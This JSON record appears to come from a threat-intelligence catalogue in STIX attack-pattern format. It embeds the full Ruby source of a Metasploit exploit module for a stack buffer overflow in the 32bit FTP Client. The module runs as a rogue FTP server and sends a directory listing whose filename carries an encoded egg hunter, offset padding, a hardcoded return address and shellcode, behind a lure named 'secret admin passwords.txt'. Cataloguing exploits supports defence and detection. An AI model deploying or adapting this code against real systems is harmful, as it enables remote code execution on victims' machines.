{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e492391c-9886-423b-8776-55e5929bf60a",
    "created": "2024-08-14T16:51:14.653088Z",
    "modified": "2024-08-14T16:51:14.653091Z",
    "name": "32bit FTP Client Stack Buffer Overflow ",
    "description": " This module exploits a stack buffer overflow in 32bit ftp client, triggered when trying to download a file that has an overly long filename. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/ftp/32bitftp_list_reply.rb",
            "external_id": "32bitftp_list_reply.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.corelan.be:8800/index.php/2010/10/12/death-of-an-ftp-client/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::FtpServer\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => '32bit FTP Client Stack Buffer Overflow ',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in 32bit ftp client, triggered when trying to\n          download a file that has an overly long filename.\n      },\n      'Author' \t =>\n        [\n          'fancy',  # found the bug\n          'corelanc0d3r <peter.ve[at]corelan.be>'  # helped writing this module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'OSVDB', '68703' ],\n          [ 'URL', 'http://www.corelan.be:8800/index.php/2010/10/12/death-of-an-ftp-client/' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Payload'        =>\n        {\n          'BadChars' => \"\\x00\\xff\\x0a\",\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'XP Universal', { 'Offset' => 259, 'Ret' => 0x004393ED  } ],  #RETN 32bitftp.exe\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2010-10-12',\n      'DefaultTarget'  => 0))\n\n  end\n\n  def setup\n    super\n  end\n\n  def on_client_unknown_command(c,cmd,arg)\n    c.put(\"200 OK\\r\\n\")\n  end\n\n\n  def on_client_command_list(c,arg)\n      code = 150\n      c.put(\"#{code} OK.\\r\\n\")\n      code = 226\n      c.put(\"#{code} Directory ok.\\r\\n\")\n\n      conn = establish_data_connection(c)\n      if(not conn)\n        c.put(\"425 Can't build data connection\\r\\n\")\n        return\n      end\n      print_status(\" - Data connection set up\")\n\n      filename =  \"\\x02\"  #prevent crash\n      filename << \"secret admin passwords.txt\" #se = \\x73\\x65 = jump forward, over filename, to hunter\n      filename << \" \" * 77\n      #custom encoded egg hunter\n      filename << \"\\x89\\xe2\\xda\\xd6\\xd9\\x72\\xf4\\x58\\x50\\x59\\x49\\x49\\x49\\x49\\x49\"\n      filename << \"\\x49\\x49\\x49\\x49\\x49\\x43\\x43\\x43\\x43\\x43\\x43\\x37\\x51\\x5a\\x6a\"\n      filename << \"\\x41\\x58\\x50\\x30\\x41\\x30\\x41\\x6b\\x41\\x41\\x51\\x32\\x41\\x42\\x32\"\n      filename << \"\\x42\\x42\\x30\\x42\\x42\\x41\\x42\\x58\\x50\\x38\\x41\\x42\\x75\\x4a\\x49\"\n      filename << \"\\x45\\x36\\x4b\\x31\\x4a\\x6a\\x49\\x6f\\x44\\x4f\\x42\\x62\\x50\\x52\\x43\"\n      filename << \"\\x5a\\x45\\x52\\x46\\x38\\x48\\x4d\\x44\\x6e\\x45\\x6c\\x45\\x55\\x43\\x6a\"\n      filename << \"\\x50\\x74\\x4a\\x4f\\x4d\\x68\\x43\\x47\\x44\\x70\\x46\\x50\\x43\\x44\\x4e\"\n      filename << \"\\x6b\\x4b\\x4a\\x4c\\x6f\\x43\\x45\\x49\\x7a\\x4c\\x6f\\x44\\x35\\x4a\\x47\"\n      filename << \"\\x4b\\x4f\\x4d\\x37\\x41\\x41\"\n      filename << \" \" * (target['Offset']-filename.length)\n\n      addr1 = \"\\x40\\x60\\x3A\\x76\"  # RW imm32.dll\n      addr2 = \"\\x44\\x54\\x48\\x00\"  # data section 32bitftp.exe\n      addr3 = [target.ret].pack('V') # b00m !\n\n      strfile = filename\n      strfile << addr3\n      strfile << addr2\n      strfile << addr1\n      strfile << \"w00tw00t\"\n      strfile << payload.encoded\n\n      print_status(\" - Sending directory list via data connection\")\n      dirlist = \"-rw-rw-r--    1 1176     1176         1060 Apr 23 23:17  #{strfile}.bin\\r\\n\\r\\n\"\n      conn.put(dirlist)\n      conn.close\n      print_status(\" - LIST sent, wait for user to double click file...\")\n      return\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-10-12",
    "x_mitre_platforms": [
        "win'"
    ]
}